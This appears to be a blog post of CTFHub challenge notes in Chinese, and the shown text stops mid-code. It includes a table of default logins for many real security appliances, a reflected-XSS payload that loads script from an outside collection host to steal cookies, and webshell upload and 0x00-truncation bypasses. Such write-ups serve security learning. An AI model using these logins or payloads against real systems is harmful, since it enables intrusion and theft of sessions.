{"title":"CTFHub-wp","uid":"d58b830525b9df5a19c1d8f3036b3b91","slug":"wp-CTFHub","date":"2022-07-27T09:31:30.845Z","updated":"2023-09-02T08:37:24.572Z","comments":true,"path":"api/articles/wp-CTFHub.json","keywords":null,"cover":"/img/33.jpg","content":"<p><code>做做笔记</code></p>\n<span id=\"more\"></span>\n\n<h1 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h1><h2 id=\"1-密码口令\"><a href=\"#1-密码口令\" class=\"headerlink\" title=\"1.密码口令\"></a>1.密码口令</h2><h3 id=\"1）弱口令\"><a href=\"#1）弱口令\" class=\"headerlink\" title=\"1）弱口令\"></a>1）弱口令</h3><p>一般思维，</p>\n<p>用户名：admin，root</p>\n<p>密码：password，admin123，123456</p>\n<p>可以用<strong>top100字典</strong>（可以网上找一下）跑一下，但有的可能需要<strong>枚举法</strong></p>\n<p>比如<strong>admin888</strong>或者<strong>admin255</strong>这样的类似的，就需要在后面用枚举法找出，字典并没包含这种类似情况</p>\n<h3 id=\"2）默认口令\"><a href=\"#2）默认口令\" class=\"headerlink\" title=\"2）默认口令\"></a>2）默认口令</h3><p>就是系统默认的口令，在渗透测试过程中，最常见的情况就是遇到弱口令得到入口从而攻陷整个系统，由于很多系统管理员缺少安全意识，口令往往是系统默认设置的口令</p>\n<pre><code>常见网络安全设备弱口令(默认口令)\n设备    默认账号    默认密码\n深信服产品    sangfor    sangfor sangfor@2018 sangfor@2019\n深信服科技 AD        dlanrecover\n深信服负载均衡 AD 3.6    admin    admin\n深信服WAC ( WNS V2.6)    admin    admin\n深信服VPN    Admin    Admin\n深信服ipsec-VPN (SSL 5.5)    Admin    Admin\n深信服AC6.0    admin    admin\nSANGFOR防火墙    admin    sangfor\n深信服AF(NGAF V2.2)    admin    sangfor\n深信服NGAF下一代应用防火墙(NGAF V4.3)    admin    admin\n深信服AD3.9    admin    admin\n深信服上网行为管理设备数据中心    Admin    密码为空\nSANGFOR_AD_v5.1    admin    admin\n网御漏洞扫描系统    leadsec    leadsec\n天阗入侵检测与管理系统 V7.0    Admin    venus70\nAudit    venus70\nadm    venus70\n天阗入侵检测与管理系统 V6.0    Admin    venus60\nAudit    venus60\nadm    venus60\n网御WAF集中控制中心(V3.0R5.0)    admin    leadsec.waf\naudit    leadsec.waf\nadm    leadsec.waf\n联想网御    administrator    administrator\n网御事件服务器    admin    admin123\n联想网御防火墙PowerV    administrator    administrator\n联想网御入侵检测系统    lenovo    default\n网络卫士入侵检测系统    admin    talent\n网御入侵检测系统V3.2.72.0    adm    leadsec32\nadmin    leadsec32\n联想网御入侵检测系统IDS    root    111111\nadmin    admin123\n科来网络回溯分析系统    csadmin    colasoft\n中控考勤机web3.0    administrator    123456\nH3C iMC    admin    admin\nH3C SecPath系列    admin    admin\nH3C S5120-SI    test    123\nH3C智能管理中心    admin    admin\nH3C ER3100    admin    adminer3100\nH3C ER3200    admin    adminer3200\nH3C ER3260    admin    adminer3260\nH3C    admin    adminer\nadmin    admin\nadmin    h3capadmin\nh3c    h3c\n360天擎    admin    admin\n网神防火墙    firewall    firewall\n天融信防火墙NGFW4000    superman    talent\n黑盾防火墙    admin    admin\nrule    abc123\naudit    abc123\n华为防火墙    telnetuser    telnetpwd\nftpuser    ftppwd\n方正防火墙    admin    admin\n飞塔防火墙    admin    密码为空\nJuniper_SSG__5防火墙    netscreen    netscreen\n中新金盾硬件防火墙    admin    123\nkill防火墙(冠群金辰)    admin    sys123\n天清汉马USG防火墙    admin    venus.fw\nAudit    venus.audit\nuseradmin    venus.user\n阿姆瑞特防火墙    admin    manager\n山石网科    hillstone    hillstone\n绿盟安全审计系统    weboper    weboper\nwebaudit    webaudit\nconadmin    conadmin\nadmin    admin\nshell    shell\n绿盟产品        nsfocus123\nTopAudit日志审计系统    superman    talent\nLogBase日志管理综合审计系统    admin    safetybase\n网神SecFox运维安全管理与审计系统    admin    !1fw@2soc#3vpn\n天融信数据库审计系统    superman    telent\nHillstone安全审计平台    hillstone    hillstone\n网康日志中心    ns25000    ns25000\n网络安全审计系统（中科新业）    admin    123456\n天玥网络安全审计系统    Admin    cyberaudit\n明御WEB应用防火墙    admin    admin\nadmin    adminadmin\n明御攻防实验室平台    root    123456\n明御安全网关    admin    adminadmin\n明御运维审计与册风险控制系统    admin    1q2w3e\nsystem    1q2w3e4r\nauditor    1q2w3e\noperator    1q2w3e4r\n明御网站卫士    sysmanager    sysmanager888\n亿邮邮件网关    eyouuser    eyou_admin\neyougw    admin@(eyou)\nadmin    +-ccccc\nadmin    cyouadmin\nWebsense邮件安全网关    administrator    admin\n梭子鱼邮件存储网关    admin    admin\n</code></pre>\n<h2 id=\"2-信息泄露-备份文件下载\"><a href=\"#2-信息泄露-备份文件下载\" class=\"headerlink\" title=\"2.信息泄露-备份文件下载\"></a>2.信息泄露-备份文件下载</h2><p><img src=\"/post/wp-CTFHub/image-20220919213733369.png\" alt=\"image-20220919213733369\"></p>\n<h2 id=\"2-1-信息泄露-robots-txt\"><a href=\"#2-1-信息泄露-robots-txt\" class=\"headerlink\" title=\"2.1 信息泄露-robots.txt\"></a>2.1 信息泄露-robots.txt</h2><pre><code>访问url/robots.txt\n</code></pre>\n<p>查看爬虫协议</p>\n<h2 id=\"2-2-信息泄露-bak文件\"><a href=\"#2-2-信息泄露-bak文件\" class=\"headerlink\" title=\"2.2 信息泄露-bak文件\"></a>2.2 信息泄露-bak文件</h2><pre><code>访问url/文件名.后缀名.bak\n</code></pre>\n<p>下载bak（备份文件）</p>\n<h2 id=\"2-3-信息泄露-vim缓存\"><a href=\"#2-3-信息泄露-vim缓存\" class=\"headerlink\" title=\"2.3 信息泄露-vim缓存\"></a>2.3 信息泄露-vim缓存</h2><h3 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h3><p>在使用<code>vim</code>时会创建临时缓存文件，关闭<code>vim</code>时缓存文件则会被删除，当<code>vim</code>异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容</p>\n<p>以 <code>index.php</code> 为例：<br><strong>第一次</strong>产生的交换文件名为 <code>.index.php.swp</code></p>\n<p><strong>再次意外退出</strong>后，将会产生名为 <code>.index.php.swo</code> 的交换文件</p>\n<p><strong>第三次产生</strong>的交换文件则为 <code>.index.php.swn</code><br>作用</p>\n<p><u>可用来恢复意外退出的文件</u></p>\n<h3 id=\"如何利用\"><a href=\"#如何利用\" class=\"headerlink\" title=\"如何利用\"></a>如何利用</h3><p><code>SWP</code>文件为隐藏文件，操作时需要在文件名前加.</p>\n<p>针对<code>SWP</code>备份文件，我们可以使用<code>vim -r filename</code>命令来恢复文件<br>(<code>vim</code>使用的缓存存储为一种固定格式的二进制文件。而我们一般编辑的时明问可见字符，在vim的缓存中这些可见字符会原样保留,所以显示是一种乱码)<br>根据提示按回车进行恢复</p>\n<h2 id=\"2-4-信息泄露-DS-Store\"><a href=\"#2-4-信息泄露-DS-Store\" class=\"headerlink\" title=\"2.4 信息泄露-.DS_Store\"></a>2.4 信息泄露-.DS_Store</h2><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。</p></blockquote>\n<pre><code>访问url/.DS_Store\n</code></pre>\n<p>下载<code>DS_Store</code>文件</p>\n<h2 id=\"3-信息泄露-Git泄露-log\"><a href=\"#3-信息泄露-Git泄露-log\" class=\"headerlink\" title=\"3.信息泄露-Git泄露-log\"></a>3.信息泄露-Git泄露-log</h2><p> 第一次使用<strong>githack</strong>，记录一下</p>\n<p><strong>注意githack需要python2.7版本</strong></p>\n<p><code>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。</code></p>\n<p><code>GitHack是一个.git泄露利用测试脚本，通过泄露的文件，还原重建工程源代码。</code></p>\n<h3 id=\"工作原理\"><a href=\"#工作原理\" class=\"headerlink\" title=\"工作原理\"></a>工作原理</h3><p>1、解析<code>.git/index</code>文件，找到工程中所有的： ( 文件名，文件sha1 )<br>2、去<code>.git/objects/</code> 文件夹下下载对应的文件<br>3、<code>zlib</code>解压文件，按原始的目录结构写入源代码</p>\n<h3 id=\"优点\"><a href=\"#优点\" class=\"headerlink\" title=\"优点\"></a>优点</h3><p>速度快，默认20个工作线程<br>尽量还原所有的源代码，缺失的文件不影响脚本工作<br>脚本不需要执行额外的git命令，<code>all you need is python</code><br>脚本无需浏览目录</p>\n<h3 id=\"用法示例\"><a href=\"#用法示例\" class=\"headerlink\" title=\"用法示例\"></a>用法示例</h3><p>注意这里在url后面需要加上.git，用dirsearch可以扫出来（python3）</p>\n<pre><code>GitHack.py http://www.openssl.org/.git/\n</code></pre>\n<p>然后在目录<code>dist</code>就会生成对应目录 </p>\n<p>打开目录，输入<code>cmd</code>，执行<code>git log</code>【<code>git log</code> 可以查看<code>commit history</code>，也就是命令执行的历史，可以看看之前执行过哪些命令，方便后面查询命令执行的具体内容】</p>\n<p><img src=\"/post/wp-CTFHub/image-20220728230330073.png\" alt=\"image-20220728230330073\"></p>\n<p>然后复制<code>add flag</code>这个命令的代码，如上图<code>75272ca078b7eedcf329a2b08f6e4faae0a36a99</code></p>\n<p>然后用<code>git diff</code></p>\n<p>【</p>\n<p>git diff比较两个版本的差异，</p>\n<p>这里后面只有<strong>一个命令</strong>就是比较本地工作区和缓存区的信息区别</p>\n<p>如果后面有<strong>两个命令</strong>，就是比较这两个命令的差别</p>\n<p>】</p>\n<p><img src=\"/post/wp-CTFHub/image-20220728231134513.png\" alt=\"image-20220728231134513\"></p>\n<p>这里比较，就得到了<code>flag</code></p>\n<h2 id=\"4-信息泄露-Git泄露-Stash\"><a href=\"#4-信息泄露-Git泄露-Stash\" class=\"headerlink\" title=\"4.信息泄露-Git泄露-Stash\"></a>4.信息泄露-Git泄露-Stash</h2><h3 id=\"git-stash-的作用\"><a href=\"#git-stash-的作用\" class=\"headerlink\" title=\"git stash 的作用\"></a>git stash 的作用</h3><p>git stash用于想要保存当前的修改,但是想回到之前最后一次提交的干净的工作仓库时进行的操作.git stash将本地的修改保存起来,并且将当前代码切换到HEAD提交上.</p>\n<p>通过git stash存储的修改列表,可以通过<u><strong>git stash list</strong></u>查看.<u><strong>git stash show</strong></u>用于校验,<u><strong>git stash apply</strong></u>用于重新存储.直接执行<u><code>git stash</code>等同于<code>git stash save.</code></u></p>\n<p>最新的存储保存在<code>refs/stash</code>中老的存储可以通过相关的参数获得,例如<code>stash@&#123;0&#125;</code>获取最新的存储,stash@{1}获取次新<code>.stash@&#123;2.hour.ago&#125;</code>获取两小时之前的.存储可以直接通过索引的位置来获得<code>stash@&#123;n&#125;</code>.</p>\n<p>操作同<code>2.log</code></p>\n<p>可以先用<code>dirsearch</code>扫一下， 发现<code>refs/stash</code>文件，</p>\n<p>然后用<code>GitHack</code>扫描</p>\n<p>在生成文件夹里有<code>stash</code>文件</p>\n<pre><code>`D:\\GitHack-master\\dist\\challenge-8d48663e236c2ebc.sandbox.ctfhub.com_10800\\.git\\refs`\n</code></pre>\n<p><img src=\"/post/wp-CTFHub/image-20220729115457869.png\" alt=\"image-20220729115457869\"></p>\n<p>打开看到</p>\n<p><img src=\"/post/wp-CTFHub/image-20220729115528299.png\" alt=\"image-20220729115528299\"></p>\n<p>在生成的文件夹下用</p>\n<pre><code>git diff d8c1978b1e71300574e1bb5335a01124b3a55569\n</code></pre>\n<p>得到<code>flag</code></p>\n<p>【也可以使用 <code>git bash</code>，直接在生成的文件夹下</p>\n<p>执行<code>git stash list</code> </p>\n<pre><code>查看stash了哪些存储\n</code></pre>\n<p>然后执行<code>git stash pop</code></p>\n<pre><code>恢复之前缓存的工作目录，将缓存堆栈中的对应stash删除，\n并将对应修改应用到当前的工作目录下,默认为第一个stash,即stash@&#123;0&#125;，\n\n如果要应用并删除其他stash，命令：git stash pop stash@&#123;$num&#125; ，\n比如应用并删除第二个：git stash pop stash@&#123;1&#125;）\n</code></pre>\n<p>然后会在该目录下生成一个新的<code>txt</code>文件，打开或用<code>cat</code>命令，得到<code>flag</code></p>\n<p>】</p>\n<h2 id=\"5-信息泄露-SVN泄露\"><a href=\"#5-信息泄露-SVN泄露\" class=\"headerlink\" title=\"5.信息泄露-SVN泄露\"></a>5.信息泄露-SVN泄露</h2><p><code>当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。</code></p>\n<p>这道题需要运用<code>dvcs-ripper</code>工具进行处理</p>\n<p>可以先用<code>dirsearch</code>扫出<code>.svn</code>目录，说明有<code>SVN</code>泄露</p>\n<p>和<code>githack</code>类似，</p>\n<pre><code>./rip-svn.pl -v -u url/.svn\n</code></pre>\n<p>然后在dvcs-ripper目录里，进入.svn目录</p>\n<p><img src=\"/post/wp-CTFHub/image-20220729175208298.png\" alt=\"image-20220729175208298\"></p>\n<p>然后进入pristine目录，进去发现两个目录，挨个打开</p>\n<p><img src=\"/post/wp-CTFHub/image-20220729175252045.png\" alt=\"image-20220729175252045\"></p>\n<p><img src=\"/post/wp-CTFHub/image-20220729175429878.png\" alt=\"image-20220729175429878\"></p>\n<p>发现一个目录下是网站页面源码，另一个就是<code>flag</code></p>\n<p>得到<code>flag</code></p>\n<h2 id=\"6-信息泄露-HG泄露\"><a href=\"#6-信息泄露-HG泄露\" class=\"headerlink\" title=\"6.信息泄露-HG泄露\"></a>6.信息泄露-HG泄露</h2><pre><code>`当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。`\n</code></pre>\n<p>可以先用<code>dirsearch</code>扫出<code>.hg</code>目录，说明有<code>HG</code>泄露</p>\n<p>这个和<code>SVN</code>一样，只不过要改成<code>.hg</code></p>\n<pre><code>./rip-hg.pl -v -u url/.hg\n</code></pre>\n<p><img src=\"/post/wp-CTFHub/image-20220730164340016.png\" alt=\"image-20220730164340016\"></p>\n<p>发现两个文件，猜测为<code>HG</code>泄露文件</p>\n<p><img src=\"/post/wp-CTFHub/image-20220730164428184.png\" alt=\"image-20220730164428184\"></p>\n<p>发现<code>flag</code>文本文件</p>\n<p><img src=\"/post/wp-CTFHub/image-20220730164949862.png\" alt=\"image-20220730164949862\"></p>\n<p><code>url+flag_973127138.txt</code></p>\n<p>得到<code>flag</code></p>\n<h2 id=\"7-xss-xss反射型\"><a href=\"#7-xss-xss反射型\" class=\"headerlink\" title=\"7.xss-xss反射型\"></a>7.xss-xss反射型</h2><p>发现它有两个输入框</p>\n<p><img src=\"/post/wp-CTFHub/image-20220731104635854.png\" alt=\"image-20220731104635854\"></p>\n<p>第一个输入测试语句，成功弹窗</p>\n<p>第二个是发送<code>url</code>，盲猜是发到后台</p>\n<p>看了一些<code>wp</code>，发现需要使用<code>xss</code>测试平台<code>http://xsscom.com//index.php</code></p>\n<p>先创建项目</p>\n<p><img src=\"/post/wp-CTFHub/image-20220731113619175.png\" alt=\"image-20220731113619175\"></p>\n<p>设置配置</p>\n<p><img src=\"/post/wp-CTFHub/image-20220731113753893.png\" alt=\"image-20220731113753893\"></p>\n<p>然后点击查看代码</p>\n<p><img src=\"/post/wp-CTFHub/image-20220731113810045.png\" alt=\"image-20220731113810045\"></p>\n<p>在最下面看到</p>\n<p><img src=\"/post/wp-CTFHub/image-20220731113837566.png\" alt=\"image-20220731113837566\"></p>\n<p>把代码</p>\n<pre><code>&lt;/textarea&gt;&#39;&quot;&gt;&lt;script src=http://xsscom.com//9VJcMV&gt;&lt;/script&gt;\n</code></pre>\n<p>输入到第一个框中</p>\n<p>再把提交后的url复制，然后到第二框中发送</p>\n<p><img src=\"/post/wp-CTFHub/image-20220731114028909.png\" alt=\"image-20220731114028909\"></p>\n<p>然后返回xss测试平台上查看</p>\n<p><img src=\"/post/wp-CTFHub/image-20220731114142138.png\" alt=\"image-20220731114142138\"></p>\n<p><code>cookie</code>处出现<code>flag</code></p>\n<h2 id=\"8-文件上传-文件头检查\"><a href=\"#8-文件上传-文件头检查\" class=\"headerlink\" title=\"8.文件上传-文件头检查\"></a>8.文件上传-文件头检查</h2><p><code>文件头是直接位于文件中的一段数据,是文件的一部分</code></p>\n<p>这里过滤文件头，而且限制图片类型文件，所以可以试试上传一个没有任何问题的图片【注意图片不能太大，不然会最后用蚁剑连接会爆错，我上传1mb大小图片就报错，最后上传400字节图片才成功】</p>\n<p><img src=\"/post/wp-CTFHub/image-20220731164210465.png\" alt=\"image-20220731164210465\"></p>\n<p>上传图片后，在后面加上一句话木马，并修改文件名</p>\n<pre><code>【也可以用cmd 合成图片马，也是有图片文件头】\n\n【copy 图片名.png(.jpg)/b + 木马文件名.php(.asp/.aspx)/a 生成图片名.png(.jpg)】\n\n【已试可行】\n</code></pre>\n<p><img src=\"/post/wp-CTFHub/image-20220731164732820.png\" alt=\"image-20220731164732820\"></p>\n<p>然后正常用蚁剑连接</p>\n<p><img src=\"/post/wp-CTFHub/image-20220731164330254.png\" alt=\"image-20220731164330254\"></p>\n<p>得到<code>flag</code></p>\n<h2 id=\"9-文件上传-00截断\"><a href=\"#9-文件上传-00截断\" class=\"headerlink\" title=\"9.文件上传-00截断\"></a>9.文件上传-00截断</h2><h3 id=\"0x00截断原理：-php\"><a href=\"#0x00截断原理：-php\" class=\"headerlink\" title=\"0x00截断原理：[php&lt;5.3.29]\"></a>0x00截断原理：[php&lt;5.3.29]</h3><pre><code>0x00是十六进制表示方法，是ascii码为0的字符，在有些函数处理时，会把这个字符当做结束符。系统在对文件名的读取时，如果遇到0x00，就会认为读取已结束。这个可以用在对文件类型名的绕过上。\n\n但要注意是文件的16进制内容里的00，而不是文件名中的00 ！！！就是说系统是按16进制读取文件（或者说二进制），\n\n遇到ascii码为零的位置就停止，而这个ascii码为零的位置在16进制中是00，用0x开头表示16进制，也就是所说的0x00截断。\n\n%00是被服务器解码为0x00发挥了截断作用。\n</code></pre>\n<p><code>举个例子，url中输入的是upload/post.php%00.png，看样子是图片文件，那么后台读取到是upload/post.php，就实现了绕后目的。</code></p>\n<p>我们开始先上传一个文件试试，限制<code>jpg,png,gif</code>后缀</p>\n<p>上传成功后，没有显示上传路径，只是url变化</p>\n<p><code>http://challenge-6cc6a23c8f284d6b.sandbox.ctfhub.com:10800/?road=/var/www/html</code></p>\n<p> 猜想多半重新临时文件名，不固定，导致显示不了路径</p>\n<p>这里就需要<code>00截断</code>，要把文件上传的路径，找到，好用蚁剑连接</p>\n<p>先要清楚<code>%00</code>截断点在哪里，我们先F12看</p>\n<p>看网站源码</p>\n<pre class=\" language-html\"><code class=\"language-html\"><span class=\"token doctype\">&lt;!DOCTYPE html></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>UTF-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>CTFHub 文件上传 - 00截断<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span><span class=\"token punctuation\">></span></span>CTFHub 文件上传 - 00截断<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">></span></span>\n    &lt;form action=?road=/var/www/html/upload/ method=\"post\" enctype=\"multipart/form-data\">\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>label</span> <span class=\"token attr-name\">for</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>file<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Filename:<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>label</span><span class=\"token punctuation\">></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>file<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>file<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>file<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span> <span class=\"token punctuation\">/></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>Submit<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">></span></span>\n<span class=\"token comment\" spellcheck=\"true\">&lt;!--\nif (!empty($_POST['submit'])) {;\n    $name = basename($_FILES['file']['name']);\n    $info = pathinfo($name);\n    $ext = $info['extension'];\n    $whitelist = array(\"jpg\", \"png\", \"gif\");\n    if (in_array($ext, $whitelist)) {;\n        $des = $_GET['road'] . \"/\" . rand(10, 99) . date(\"YmdHis\") . \".\" . $ext;\n        if (move_uploaded_file($_FILES['file']['tmp_name'], $des)) {;\n            echo \"&lt;script>alert('上传成功')&lt;/script>\";\n        }; else {;\n            echo \"&lt;script>alert('上传失败')&lt;/script>\";\n        };\n    }; else {;\n        echo \"文件类型不匹配\";\n    };\n};\n--></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span>\n</code></pre>\n<p>发现里面有一串代码</p>\n<pre class=\" language-php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token operator\">--</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string\">'submit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$name</span> <span class=\"token operator\">=</span> <span class=\"token function\">basename</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$info</span> <span class=\"token operator\">=</span> <span class=\"token function\">pathinfo</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$ext</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$info</span><span class=\"token punctuation\">[</span><span class=\"token string\">'extension'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$whitelist</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"jpg\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"png\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"gif\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ext</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$whitelist</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$des</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'road'</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">.</span> <span class=\"token string\">\"/\"</span> <span class=\"token punctuation\">.</span> <span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">99</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">.</span> <span class=\"token function\">date</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"YmdHis\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">.</span> <span class=\"token string\">\".\"</span> <span class=\"token punctuation\">.</span> <span class=\"token variable\">$ext</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$des</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string\">\"&lt;script>alert('上传成功')&lt;/script>\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string\">\"&lt;script>alert('上传失败')&lt;/script>\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span><span class=\"token 